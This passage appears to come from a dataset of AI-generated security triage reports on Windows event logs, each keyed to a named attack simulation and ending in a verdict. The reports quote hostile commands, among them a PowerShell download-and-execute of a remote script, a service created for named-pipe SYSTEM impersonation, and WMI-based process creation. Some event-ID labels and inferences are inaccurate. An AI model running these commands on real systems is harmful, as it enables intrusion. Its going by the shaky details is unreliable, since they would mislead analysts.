#### Sysmon Logs:
1. **Process Creation**: There are many instances of processes like `powershell.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and instances of `wevtutil.exe` and `CompatTelRunner.exe`.
   
   - **PowerShell Activity**: Again, the extraction of `EncodedCommand` from the command line for PowerShell processes aligns with suspicious behavior as seen in PowerShell logs.

   - **Wevtutil and CompatTelRunner**: Multiple executions of `wevtutil.exe` for querying event logs can be used maliciously to learn about security or system logs. `CompatTelRunner` is a telemetry tool and its presence is not inherently suspicious.

2. **Obscure Command Line Usage**: The presence of encoded commands in `powershell.exe` activities suggests attempts to potentially avoid detection.

### Assessment:
Based on the above analysis:
- **Encoded PowerShell Commands**: This is a significant indicator as attackers often use such techniques to manipulate systems without raising alerts.
- **File Iteration using PowerShell**: Possible enumeration of system files for configuration or security weaknesses.

### Resolution:
- **Resolution: SUSPICIOUS**: The presence of suspicious PowerShell activity warrants further investigation. While there are routine system updates and operations, the use of encoded PowerShell commands, especially involving examination of `.inf` files, is unusual and potentially indicative of reconnaissance or preparatory actions for malicious activity. The behavior should be investigated further to determine the nature and intention behind these activities.

### Guidance:
- **Immediate Next Steps**:
  - Conduct a forensic review of the encoded PowerShell script usage to decode the operations being performed.
  - Review user activity logs around the timestamps of these PowerShell events.
  - Verify the source and reason for the script executing these commands.
  - Increase monitoring on `Server002` for further unusual activity, especially in PowerShell and process creation logs.

- **Preventive Measures**:
  - Implement application whitelisting to restrict unauthorized PowerShell execution.
  - Enable and check PowerShell script block logging for enhanced visibility.
  - Conduct routine endpoint security evaluations and refine alerting thresholds for anomalous PowerShell usage."
Cobalt Strike SSH (postex_ssh) pipe,"After analyzing the event logs provided, I have identified several noteworthy elements within the logs which require careful evaluation. Let's begin with the key observations:

### Key Observations:

1. **Execution of PowerShell:**
   - The sysmon logs indicate the repeated execution of `powershell.exe` and `conhost.exe`, by the user `SERVER002\\admin_test`. The executions are rapid and frequent, suggesting an automated script or process potentially running on the host. While PowerShell usage is common for legitimate administrative tasks, in this case, the absence of specific command-line arguments or scripts makes it hard to definitively label as malicious without more context.

2. **Execution of Unfamiliar Programs:**
   - Invocation of executables from user temporary directories, specifically `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe`, suggest custom or third-party scripts potentially interacting with Windows named pipes. This is consistent with behavior often seen with sophisticated penetration testing tools or malware utilizing named pipes for process communications.

3. **Use of Known Windows Tools Commonly Abused:**
   - Several benign Windows services and executables are confirmed running, such as `wevtutil.exe`, `taskhostw.exe`, and `cmd.exe` with named pipes in use—which can be typical administration tasks, but their context of usage needs to be considered.
   - `wevtutil.exe` is noted in the logs, which indicates that event logs might be steered, read, or cleared.

4. **Suspicious Command-Line Execution:**
   - Suspicious command-line execution is observed under `cmd.exe` invoking `namedpipes_executor.exe` which is peculiar and potentially insinuates a suspicious activity especially when being input from ``C:\Users\ADMIN_~1\AppData\Local\Temp``.

5. **Scheduled Microsoft Edge Updates:**
   - Numerous activities related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`) are logged, but these seem regular for background tasks related to legitimate software updating procedures.

### Security and System Events:

- **Frequent Logon Events:**
  - There are numerous logon events featuring the SYSTEM account and several logon types, privileges often related to system-initiated or scheduled tasks, indicating normal system behavior for most parts.

### Analysis and Assessment:

The combination of PowerShell execution without clearly defined actions, along with unidentified process execution from temporary directories and suspicious command-line usage indicates an environment that is potentially being used for activity not typical of standard operations. There exist strong indicators that either an external script is conducting administrative actions on the system or potentially malicious software could be present.

### Resolution:

- **Suspicion and Need for Further Investigation:**
  - Given the anomalies noted, particularly around the use of named pipes executables and PowerShell executions with unknown intentions, further investigation is strongly advised. This system should undergo a detailed review, focusing specifically on:
    - Thoroughly analyzing command-line arguments and scripts associated with `powershell.exe`.
    - Reviewing any additional logs related to named pipes activity.
    - Running a full system malware scan and potentially employing endpoint detection and response (EDR) tools to hunt for further evidence of compromise or malicious intent.

**Final Resolution: SUSPICIOUS**

The logs display behavior that is not clear — while not conclusively malicious, the activities warrant additional scrutiny to either rule out a compromise or validate the presence of non-standard business operations."
WMI Reconnaissance Processes,"After reviewing the provided Windows event logs, here’s a detailed analysis focusing on any suspicious or anomalous behavior and determining whether there's an indication of malicious activity or compromise:

### Analysis of Log Entries:

1. **Process Execution:**
   - **Sysmon Logs:** 
     - Observed the execution of several standard Windows system utilities such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `cmd.exe`. These are typical utilities often used in both legitimate and malicious activities, depending on context and command-line arguments.
     - The usage of `wevtutil.exe` suggests possible manipulation or querying of Windows Event Logs. While `wevtutil.exe` is a legitimate tool, it can be used maliciously to alter or delete event logs to cover tracks.
     - Usage of `cmd.exe` with `wmic` commands (`wmic process get caption,executablepath,commandline /format:csv`) is a common technique for process enumeration. While not inherently malicious, it is often used by attackers during reconnaissance.

2. **Privilege and Integrity Level:**
   - The processes `whoami.exe`, `cmd.exe`, and `wmic` run under ""SERVER002\\admin_test"" with a high integrity level, indicating administrative privileges. This is normal behavior for an admin account but should be verified against usual behavior for this user.
   - `sppsvc.exe` runs under the ""NT AUTHORITY\\NETWORK SERVICE"", which is typical for the Software Protection Platform service, indicating no immediate concern here.

3. **Microsoft Edge Installer Processes:**
   - Numerous processes related to `Microsoft Edge Installer` (`setup.exe`) executed with `NT AUTHORITY\\SYSTEM` rights, a normal operation typically seen during software updates or installations by such services.

4. **Security and Application Logs:**
   - The Security log shows event ID 4799 related to changing of group membership: this is associated with Microsoft Edge Installer and within what could be expected behavior during installation/updates.
   - The Application log with the Software Protection Platform Service entry is likely routine logging without security concern given the description.

### Assessment:

- **Unusual Process Execution:**
  Despite the numerous administrative-level actions being logged, the command usage and execution align with typical system administration tasks or software updates (specifically Microsoft Edge), based on the command-line arguments and the context in the logs.

- **Risks Identified:**
  - The use of `wevtutil.exe` requires context to determine if it was trying to clear event logs or simply query them.
  - Execution of commands via CMD (`wmic…`) can indicate reconnaissance if unusual for this system or user.

- **Guidance on How to Proceed:**
  - Verify if the `admin_test` user account activity aligns with typical admin tasks. Check if such administrative actions (especially around `wevtutil.exe` and `wmic`) are common for this time and date.
  - Confirm the legitimacy of the processes and the user actions, especially focusing on the `admin_test` account. Audit the privileges and usage history of this account.
  - Review any additional logs outside this extract to check for any tampering attempts or additional context around these commands.

### Final Resolution:

The activities logged in these entries seem to be administrative tasks and software update processes:

- **Resolution: BENIGN**

With no explicit evidence of malicious intent and context indicating routine operations typical for the observed processes, the evaluation concludes as benign but suggests verification and continuous monitoring for assurance."
Writes text to a file and displays it,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided Windows event logs, several observations can be made regarding the processes and user activities within the system:

#### Sysmon Logs:

1. **Process Creation Events (EventID 5):**
   - The logs show multiple executions of system utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`), all initiated by the user `SERVER002\admin_test`. 
   - Notably, `wevtutil.exe` is being executed frequently. This utility is used to manage event logs and is frequently used in both legitimate administrative tasks and malicious activity, particularly for clearing logs or exporting them during unauthorized activities.

2. **Command Execution (EventID 1):**
   - A `cmd.exe` process executes the command: `cmd.exe /c echo ""Hello from the Windows Command Prompt!"" > ""%TEMP%\test.bin"" & type ""%TEMP%\test.bin""`. This seems like a benign command used for testing or demonstration purposes (creating a text file and displaying its contents).

3. **Unusual Privileges (Security Log - EventID 4672):**
   - The account `admin_test` was granted high-level privileges (e.g., `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) during the session. This is typical for administrative accounts but should be corroborated against typical user activity and roles. 

4. **User Login (Security Log - EventID 4624 and 4634):**
   - There was a login event for `admin_test` using NTLM authentication and a subsequent logoff event. This alone isn't suspicious, but it might be if the login source (i.e., `DESKTOP-3HL5B2P`) is unfamiliar or unexpected for this user.

5. **Background Processes:**
   - Processes like `TiWorker.exe`, `TrustedInstaller.exe`, and `sppsvc.exe` are standard system processes related to Windows updates and licensing services running under `NT AUTHORITY\SYSTEM` or `NETWORK SERVICE`. Their presence is typical for system maintenance activities.

### Assessment of Potential Threats

- **Suspicious Process Execution (wevtutil.exe):** 
  - Although not outright malicious, repeat use of `wevtutil.exe` is noteworthy. If `admin_test` isn't expected to manage event logs frequently, this activity should be investigated further. 

- **Elevation of Privileges:** 
  - The account `admin_test` is utilizing elevated privileges. Confirm that this account is authorized for the tasks performed and review the necessity of such privileges.
  
- **Command Usage:** 
  - The observed command execution using `cmd.exe` to create and display a text file seems benign as it does not attempt to manipulate system states or extract data.

### Resolution

Based on the assessment of the available logs and activities:

**Resolution: SUSPICIOUS** 

The repeated use of `wevtutil.exe` by the `admin_test` user, combined with elevated privileges, suggests there is a need for further investigation. These actions could be legitimate if `admin_test` is performing routine administrative tasks. However, it is crucial to verify the user's role, recent activities, and ensure no policy violations or unauthorized attempts to clear or export event logs are occurring.

### Guidance on How to Proceed

1. **Verification of Activity:**
   - Verify with IT management whether the activities performed by `admin_test` are expected and approved.

2. **Role and Permissions Check:**
   - Review the roles and permissions assigned to `admin_test` and assess whether elevated privileges are necessary.

3. **Log Monitoring:**
   - Enhance monitoring for sensitive actions like event log manipulation by enabling alerts for such activities.

4. **User Behavior Analysis:**
   - Analyze the overall behavior of the user `admin_test` to identify deviations from normal behavior patterns.

5. **Further Investigation:**
   - Conduct a deeper analysis of other related logs not provided to confirm if there are any additional concerning activities related to unauthorized usage of administrative tools.

These steps will help determine whether the observed activities align with policy or if they hint at a potential security compromise requiring remedial actions."
LNK Payload Download,"Based on the thorough analysis of the provided Windows event logs, several points of interest have been identified:

1. **System Log Analysis:**
   - The logs show multiple entries related to time adjustments.
   - Notable entries include adjustments made by `svchost.exe`, a legitimate system process. However, time changes without apparent reason or regularity may suggest attempts to manipulate logs or timestamps, which can be a tactic used by attackers.

2. **Sysmon Log Analysis:**
   - `whoami.exe` and `hostname.exe` executions are observed. These commands are used to ascertain system and user information but are not inherently malicious.
   - `conhost.exe` processes are invoked by `whoami.exe`. This is expected since `conhost.exe` assists with command execution in console windows.
   - Multiple instances of `wevtutil.exe`, which is used to manage Windows Event logs, are seen. This might suggest attempts to clear or modify event logs.
   - A **suspicious PowerShell command** is logged, invoking a web request to download a potentially malicious file and executing it. This behavior is highly indicative of malicious activity.
   - `taskkill.exe` is used to terminate processes, here specifically targeting `a.exe`. This could be a routine operation but could also indicate interference with security processes.

3. **Windows PowerShell Log Analysis:**
   - The PowerShell command line captured in the logs reveals downloading and executing a `.lnk` file. Such activity can often point towards initial stages of malware deployment.

4. **Security Log Analysis:**
   - Security logs indicate a standard system process running with elevated privileges. While this entry itself is not malicious, the environmental context surrounding it raises concern due to the presence of a suspicious PowerShell activity.

5. **Application Log Analysis:**
   - The Application log entries related to Windows Defender indicate it is operational, which may provide some defense mechanism.
   
**Key Observations and Concerns:**
- The invocation of PowerShell for downloading and executing a file from an external source is highly suspicious and suggests potential compromise.
- Although utility tools like `whoami.exe` and `hostname.exe` are commonly used, their execution amidst these activities could represent reconnaissance steps taken by an attacker post-compromise.
- `wevtutil.exe` usage may suggest log tampering attempts.

**Resolution:**
- **MALICIOUS** - The logs reflect activities consistent with malicious behavior, notably the execution of a suspicious PowerShell script involving external file download and execution.

**Guidance for Next Steps:**
- Initiate a full malware scan on `Server002` using up-to-date antivirus or endpoint detection and response (EDR) tools.
- Isolate the host from the network to prevent lateral movement or data exfiltration.
- Conduct forensic analysis on the suspicious downloaded file and any artifacts related to the PowerShell command.
- Review user accounts and privileged access to limit and secure sensitive operations.
- Investigate any potential data breaches and assess organizational impact.
- Enhance security monitoring and establish stricter policies around script execution and external downloads."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,"Upon detailed analysis of the provided Windows event logs, several points of interest were noted, particularly concerning the usage of PowerShell and related activities, which could indicate suspicious behavior.

### Analysis:

1. **PowerShell Execution:**
   - Multiple instances of PowerShell were executed with encoded commands, as evidenced by entries such as:
     ```json
     {""@Name"":""CommandLine"",""#text"":""\""powershell.exe\"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop}""}}
     ```
   - The use of `EncodedCommand` is often a tactic used to obfuscate the command being run, which can be an indicator of malicious activity.

2. **Repeated Execution of System Utilities:**
   - The frequent running of utilities such as `conhost.exe`, `wevtutil.exe`, and `whoami.exe`:
     - Although they are legitimate Windows utilities, they can be used for reconnaissance or facilitating privilege escalation.

3. **Constant User and High Integrity Level:**
   - All actions were executed by the same user `SERVER002\\admin_test` with a high integrity level, indicating elevated privileges, which doesn’t align with routine tasks and could indicate misuse or compromise of the account.

4. **Execution of `hostname.exe` and `whoami.exe`:**
   - These commands were executed around the same time as the PowerShell activities, often used to gather information about the system environment and user context. Suspicious if not justified by legitimate administrative tasks.

5. **Timing and Frequency:**
   - All these events occurred in rapid succession, which is uncommon in usual administrative activities, further raising suspicions regarding their legitimacy.

### Assessment:

Based on the analyzed logs, the activities seem suspicious due to:
- The use of obfuscated PowerShell commands.
- System utilities being invoked in a manner consistent with reconnaissance.
- The same privileged user executing all actions with notable frequency and momentary context.

These could potentially indicate reconnaissance or preparatory steps in a malicious campaign, possibly aimed towards data extraction or lateral movement.

### Resolution: SUSPICIOUS

Before finalizing the activity as malicious, further investigation is required to determine the intent of these commands and whether they align with legitimate administrative actions:
- **Check with the user/server administrator** to confirm if such tasks were planned or required.
- **Review historical logs** for similar patterns indicative of repeated behavior.
- **Analyze network logs** for outbound connections following these actions, which may suggest data exfiltration attempts.

### Guidance:

- **Monitor the user account** `SERVER002\\admin_test` for additional unusual activity.
- **Implement stricter auditing** and monitoring on PowerShell execution, particularly with encoded commands.
- **Conduct a thorough review** of the server configuration and any recent changes in administrative scripts or utilities usage.

If no legitimate justification for these actions is found, it should be treated with urgency as a potential compromise scenario."
BlackCat pre-encryption cmds with Lateral Movement,"### Detailed Analysis of Logs

**Suspicious or Anomalous Behavior:**

1. **Unusual PowerShell Commands:**
   - Multiple PowerShell executions were observed (EventID 600 and 400) with a complex command chain. The command includes attempts to:
     - Retrieve UUIDs using WMIC.
     - Modify symlink behavior using `fsutil`.
     - Modify system registry keys related to networking parameters.
     - Execute a potentially suspicious script from a temporary directory (`script.exe`), including the text `--access-token`, which suggests an attempt to capture authentication tokens or credentials.

2. **Frequent Use of `wevtutil.exe`, `conhost.exe`, and `PowerShell.exe`:**
   - The logs show recurring execution of `wevtutil.exe`, `conhost.exe`, `PowerShell.exe`, and `cmd.exe` commands under the `SERVER002\admin_test` user.
   - These processes are typically associated with administrative actions or are used in script-based attacks for log manipulation or command execution.

3. **Command Line Activity Suggesting Privilege Escalation or Lateral Movement:**
   - The command chains involved in PowerShell executions appear to attempt operations that may require elevated privileges (e.g., manipulation of symlink evaluation settings, registry modifications).
   - These actions are often seen in attacks aiming to establish persistence or escalate privileges.

4. **Execution of Unknown Binary `script.exe`:**
   - The presence of `script.exe` being executed with the `/c echo ""--access-token""` hints at potentially malicious activity, possibly involving token theft or network scanning.

5. **Abnormal Registry Key Modifications:**
   - The registry was modified to adjust the `MaxMpxCt` parameter on the LanmanServer service. This can be an attempt to influence server behavior, potentially destabilizing or exposing the system to further threats.

**Assessment and Findings:**

Based on the detailed analysis above, the logs indicate strong signs of suspicious activity that may suggest a compromise:
- There is significant evidence that a potentially malicious script is being executed using PowerShell, which involves the collection of system UUIDs and unauthorized modification of system settings.
- `fsutil` and registry edits are commonly associated with malicious scripts attempting to persist or manipulate system behavior.
- While there are no definitive signs of direct compromise, such as known malware executions flagged by antivirus, the actions observed are consistent with preparations for malicious activity.

**Guidance and Next Steps:**

Given the indications of potentially malicious activity, the following steps are recommended:
1. **Immediate Review of the `script.exe`**: Analyze the script's contents to understand its functionality and purpose.
2. **Check for Persistence Mechanisms**: Investigate common persistence mechanisms (startup scripts, scheduled tasks, registry keys) for anomalies.
3. **Audit User Activities**: Look into the `admin_test` user activities during the specified time for unauthorized actions or deviations from normal behavior.
4. **Restrict and Monitor PowerShell Usage**: Implement tighter controls and monitoring for PowerShell scripts and their execution.
5. **Strengthen Logging**: Enhance logging capabilities to capture more detailed command-line activities and file accesses.

**Resolution:**
- **SUSPICIOUS**: The activities noted in the logs warrant further investigation to rule out or identify any ongoing or potential compromise. Conduct a thorough investigation to ensure the system's integrity and security."
Cobalt Strike Lateral Movement (psexec_psh) pipe,"Based on the detailed analysis of the provided Sysmon, Application, and absence of System, Windows PowerShell, and Security logs, the following observations have been made:

### Observations:

1. **Frequent Usage of PowerShell and Command Prompt:**
   - A `powershell.exe` process initiated by the user `SERVER002\\admin_test`. PowerShell is often used for both legitimate administrative tasks but can also be abused by attackers for malicious purposes.
   - There are multiple instances where commands are executed via `cmd.exe`, specifically with parameter `--pipe`, which indicates an attempt to execute or manage named pipes possibly remotely.

2. **Named Pipes Executables:**
   - The logs show processes like `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` being executed. These are possibly custom applications for communication using named pipes, which is a typical behavior in testing or specialized administrative tasks but could also signal lateral movement or backdoor setup if unexpected.

3. **Wevtutil Usage:**
   - The presence of `wevtutil.exe` processes suggests interactions with event logs. `wevtutil.exe` is a legitimate tool but is sometimes used by attackers to clear logs to cover their tracks.

4. **Miscellaneous Executions:**
   - Execution of `whoami.exe`, `hostname.exe`, and Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) appear multiple times, which in isolation are benign but could be part of reconnaissance or persistence mechanisms depending on the context.

5. **Integrity Levels and Users:**
   - Most processes run with high integrity levels and under the `SERVER002\\admin_test` user account. This strong user association indicates potential administrative usage or compromise of an administrative account.

6. **EdgeUpdate Process and Com Registration:**
   - Regular execution of Microsoft Edge Update processes and their COM Registration. These activities seem routine for updating purposes, are seen with the NT AUTHORITY\\SYSTEM user indicating system-initiated updates, and generally appear benign.

### Assessment:

- The execution of unusual processes like `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` warrants concern, especially if these applications are not part of the organization's standard toolset.
- Usage of `powershell.exe` and `wevtutil.exe` could be suspicious if not explicitly scheduled or expected, as these can be used for malicious purposes such as data exfiltration, privilege escalation, or log tampering.
- The repeated usage of `cmd.exe` alongside critical process creation suggests potentially suspicious behavior that might require follow-up to verify the legitimacy of these process executions.

### Resolution:

**SUSPICIOUS**

Based on the data, the activities could either be benign administrative tasks or signal potential malicious behavior such as reconnaissance and lateral movement. Given the ambiguous context, further investigation is needed:
- Verify with the user `admin_test` or corresponding IT department if they performed these actions.
- Check if the named pipe executors/scripts are part of known internal tools or possibly unauthorized applications.
- Review scheduled tasks and automation scripts to ensure these actions are part of legitimate activities.
- Conduct further monitoring to detect any unusual linkage between these activities and potential external or lateral network communications."
Office Generic Payload Download,"Upon reviewing the provided Windows event logs, several noteworthy observations stand out that warrant a deeper analysis.

### Suspicious Findings:

1. **PowerShell Activity**:
   - Multiple logs show the execution of a PowerShell script from the location ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"".
   - The script retrieved from ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"" and executed with parameters to manipulate content from a file path at ""C:\Users\ADMIN_~1\AppData\Local\Temp\file/data.002/src/test9-GenericfileDownload.txt"".
   - PowerShell is often utilized by attackers for malicious purposes. This script is pulling potentially malicious content from the web.

2. **Event 4798 - Security Log**:
   - The querying of the ""Guest"" account usage via `CompatTelRunner.exe`. Such behavior might suggest an attempt to investigate or utilize local accounts, which could indicate spying or reconnaissance tasks often preceding malicious actions.

3. **`wsmprovhost.exe` Activity**:
   - System processes like `wsmprovhost.exe` are seen parenting both `hostname.exe` and `whoami.exe`. This can be part of normal system management, but when correlated with suspect behaviors, it deserves examination.

4. **Frequent Execution of Administrative Utilities**:
   - The use of `wevtutil.exe` could suggest attempts to clear event logs, which is a common technique to cover tracks.
   - Similar host queries using `whoami.exe` and network identification via `hostname.exe`.

5. **EdgeUpdate Activity**:
   - There is a repetitive execution of Microsoft Edge Update processes, which can be part of regular updates but needs to be correlated with other activities to rule out misuse.

### Assessment:

The behavior observed in the logs aligns with Tactics, Techniques, and Procedures (TTPs) often associated with malicious activity, particularly regarding the suspicious PowerShell execution and potentially preparatory reconnaissance steps. Multiple executions of legitimate binaries for potentially malicious purposes are a common red flag.

### Resolution: **MALICIOUS**

Given the context and activities related to PowerShell script execution retrieving content from an external source, along with other system activities that indicate reconnaissance, this log analysis strongly suggests malicious activity. Immediate actions should be taken to contain and remediate this potential compromise.

### Guidance:

1. **Immediate Containment**:
   - Isolate the affected host (Server002) from the network to prevent any further potential lateral movement or exfiltration.

2. **Further Investigation**:
   - Deep dive into network logs to check outbound connections around the time of the PowerShell script execution.
   - Identify the scripts and textual files mentioned in URLs and analyze them for malicious content.
   - Review any changes made by the suspicious processes to determine the scope of the compromise.

3. **Remediation**:
   - Update all antivirus and threat detection systems and perform a thorough system scan.
   - Change credentials used in Server002 immediately, especially if any sensitive accounts were accessed during the timeframes of concern.

4. **Monitoring**:
   - Increase monitoring on PowerShell executions and system utilities usage across similar servers and endpoints within the organizational network.

5. **Review Security Policies**:
   - Use this incident to review and potentially harden execution policies related to PowerShell and the usage of local system accounts."
Create a Process using obfuscated Win32_Process,"### Analysis of the Logs

After a thorough review of the provided log entries, several points stand out that are worthy of analysis:

#### 1. **PowerShell Activity** 
- **Nature of Commands**: The logs detail a PowerShell command that utilizes WMI to execute `notepad.exe`. The use of `Invoke-WmiMethod` is not typical for everyday administrative tasks and is often seen in lateral movement or persistence scripts by malicious actors.
- **Command Line**: The specific command line used in PowerShell:
  ```powershell
  $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process""))
  $NewClass = $Class.Derive(""Win32_file"")
  $NewClass.Put()
  Invoke-WmiMethod -Path Win32_file -Name create -ArgumentList notepad.exe
  ```
  This command creates a new WMI class and uses it to execute a process, which is unusual behavior for legitimate administrative purposes.

#### 2. **System and Security Logs**
- **Time Discrepancy**: There are multiple events indicating a discrepancy and adjustments being made to the system time. This can be indicative of timestamp deception attempts by malicious actors.
- **Process Involvement**: All actions related to the time change are associated with `svchost.exe`, which can be legitimate, but in conjunction with other suspicious activities, it could imply nefarious use.

#### 3. **Sysmon Logs**
- **Process Execution**: The logs show a series of process executions involving:
  - `wevtutil.exe` and `conhost.exe`, which are system processes that can be used for legitimate logging and console applications, respectively.
  - The execution of `hostname.exe` and `whoami.exe` which on their own are benign but in sequence with other command line activity, might indicate reconnaissance actions performed on the system.
- **User Account**: Many of these processes were executed under the `admin_test` account, which could be normal if performed by an administrator. However, without assurance of the user's actions, it could also be suspicious.

#### 4. **Application Log**
- **Software Protection Platform Service**: There’s nothing particularly unusual here. This log entry appears to be a normal operation of the system checking its software protection status.

### Assessment

- **Suspicious Activity**: The PowerShell invocation, in particular, stands out as highly suspicious. The creation of a new WMI class and executing arbitrary processes via PowerShell could point towards potential lateral movement or backdoor establishment attempts. 
- **Why Suspicious**: The combination of unconventional PowerShell activity with time manipulation records could imply an attempt to obscure activity on the system.
- **Need for Further Investigation**: The involvement of the `admin_test` account should be explored further to understand if these were legitimate administrative activities or potentially compromised credentials used for malicious purposes.

### Recommended Actions

1. **Isolate and Monitor the System**: Temporarily isolate the affected system from the network to prevent potential spread while allowing further analysis.
2. **Credential Review**: Verify whether the `admin_test` account actions align with user intentions and ensure that credentials have not been compromised.
3. **Examine Additional Logs**: Gather more logs from related time windows and additional sources (network traffic, security tools) to provide more context.
4. **Conduct Threat Hunting**: Look for any other systems exhibiting similar behaviors, focusing on PowerShell and WMI logs.
5. **Review Patch and Security Posture**: Ensure that all patches and security configurations are in place to mitigate known vulnerabilities.

### Final Resolution
- **Resolution**: **SUSPICIOUS** - The activity observed within the logs warrants further investigation due to the unusual nature of the PowerShell command and time manipulation which could potentially indicate malicious intent."
Create a Process using WMI Query and an Encoded Command,"After reviewing the provided log entries across various categories (Sysmon, System, Windows PowerShell, Security, and Application logs) from the Windows host (Server002), I have focused on identifying anomalous behavior that could potentially indicate malicious activity.

### Detailed Analysis:

**1. Sysmon Logs:**
- **Process Executions:** 
  - A significant number of processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` executed in quick succession under the `SERVER002\admin_test` account. While individually, these processes can be legitimate, the rapid and repetitive nature of these events, especially `wevtutil.exe` and `cmd.exe` with unusual command-line activity, is worth noting.
  - A `cmd.exe` process execution with a complex command-line involving execution of PowerShell (`powershell -exec bypass ...`) in a potentially obfuscated or encoded form suggests possible malicious scripting or execution attempt. The use of `-exec bypass` is often associated with attempts to bypass PowerShell execution policies.
  
**2. System Logs:**
- **Time Change Events:**
  - There are indications of time changes on the system where the time was set back. The manipulation of system time can be suspicious as attackers might change timestamps to hide their tracks or interfere with incident logs.

**3. Windows PowerShell Logs:**
- **PowerShell Execution:**
  - The logs reflect the execution of PowerShell with the `-exec bypass` switch, which is concerning. It suggests execution of a script or command in a manner designed to avoid standard execution restrictions and logging, often seen in malicious activity.

**4. Security Logs:**
- **Audit Events:**
  - These events corroborate with the system log's time change incidents. The user logged as `LOCAL SERVICE` indicating process initiation (likely by a system service) itself is not inherently malicious but should be examined in conjunction with other findings.

**5. Application Logs:**
- The application logs contain a standard security licensing event which does not seem related to suspicious activity.

### Assessment:

Based on the collected evidence, there are several indicators of potential malicious activity, particularly around the usage of PowerShell with a suspicious execution policy bypass and a series of rapid process executions potentially aimed at evading detection or performing unauthorized actions.

### Conclusion:

**Resolution: SUSPICIOUS**

The behavior observed in the logs, particularly the process execution patterns involving PowerShell and command-line obfuscation techniques, along with time change events, suggest activities deserving further investigation. While no outright malicious activity can be definitively confirmed without more context or investigation, the nature of these entries implies that they should be treated with caution.

### Guidance:

1. **Immediate Follow-Up:**
   - Isolate the host from the network to prevent any potential spread or communication with an external attacker.
   - Perform a detailed investigation into the executed PowerShell scripts or commands, decoding any obfuscated command lines to understand their intent.

2. **Log Review and Monitoring:**
   - Enable detailed auditing for PowerShell script executions and ensure logging is appropriately capturing all such activities.
   - Increase monitoring of administrative accounts and unusual process executions, along with any time change events.

3. **Incident Response:**
   - Given the potential severity, escalate this investigation to the incident response team for a comprehensive forensic analysis. Ensure that any affected credentials, especially those with administrative privileges, are reviewed and potentially reset.

With proactive analysis, further insights might reveal whether this activity represents a targeted attack or an anomaly due to unexpected but benign operations."
WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,"### Detailed Analysis of Logs

Upon reviewing the provided Windows event logs across several channels (Security, Application, System, Windows PowerShell, and Sysmon), the following points of interest were identified:

#### Indicators of Anomalous or Suspicious Activity:

1. **Time Synchronization Events (EventID: 4616, 24, 1):**
   - Logs indicate time changes on `Server002`. While time synchronization is typical on a Windows server, frequent or unscheduled changes can be indicative of attempts to cover tracks after unauthorized activities. However, these specific events seem to correspond to typical time synchronization with `time.windows.com`.

2. **Suspicious PowerShell Activity:**
   - Multiple PowerShell logs indicate the execution of a script downloaded from `https://raw.githubusercontent.com/script/script-Techniques/master/NamedPipe/NamedPipeSystem.ps1`. The presence of `iex(new-object net.webclient).downloadstring()` is often suspicious, as it can be used to execute remote code.
   - A PowerShell script includes creating a service (`svcHighPriv`) using the command `New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! > \\\\.\\pipe\\HighPriv' -StartupType Manual`, followed by a `Start-Service` and `sc.exe delete svcHighPriv`. This sequence showcases an attempt to potentially escalate privileges or perform an unauthorized action, using a high privilege service that is created and deleted promptly.
   
3. **Service Control Manager Logs (EventID: 7045, 7009, 7000):**
   - Reflects the creation, attempted start, and failure of the service `svcHighPriv`, aligning with the PowerShell activity indicating the creation and deletion of a high-privilege service intended for malicious purposes.

4. **Sysmon Logs:**
   - Evidence of a process (`powershell.exe`) executing a remote script, as highlighted in the Sysmon EventID 1. The correlation with suspicious PowerShell entry strengthens the case of a potentially malicious activity.
   - The maintenance of processes related to `cmd.exe` and `sc.exe` for service management aligns with an attempt for unauthorized service manipulations.

#### Assessment:

Given the use of PowerShell for downloading and executing scripts, the creation and deletion of high-privilege services, and the overall configuration of scripts that facilitate unauthorized control, there's a strong indication that malicious activity has occurred on `Server002`.

#### Threat and Risk Identification:

- **Threats:** Possible infiltration of the server to gain unauthorized admin-level control, potentially enabling further malicious activities such as data exfiltration, next-level persistence mechanisms, or use as a stage for broader network attacks.
- **Risks:** If unchecked, it can lead to potential data breaches, loss of integrity and confidentiality of sensitive data, and reputational damage.

#### Guidance and Resolution:

- Immediate containment measures should be implemented, including isolating the affected system from the network to prevent further lateral movement or data extraction.
- Conduct a thorough investigation to identify the entry vector and scope of the compromise.
- Implement hardening strategies, such as restricting PowerShell executions, implementing strict service creation policies, and enhancing monitoring capabilities for suspicious service manipulations.
- After resolution, engage in a review of security policies to prevent similar incidents in the future.

### Final Resolution: MALICIOUS

The logs conclusively demonstrate actions consistent with a malicious attack on the Windows host. Immediate intervention and further investigation are recommended."
WMI Reconnaissance Software,"### Detailed Analysis:

Upon reviewing the provided logs, I've broken down my findings based on different logs and events to identify any suspicious or anomalous behavior.

1. **Security Log:**
   - **Event ID 4616**: The events indicated a system time change initiated by a process running under the `LOCAL SERVICE` account. The time was moved backward from `15:02:33.6886832` to `15:02:09.8215892`. Such an action can potentially point to attempts to cover tracks by altering logs, but there is no direct indication of malicious activity from this alone. This could also be a legitimate service operation depending on the context.

2. **Sysmon Log:**
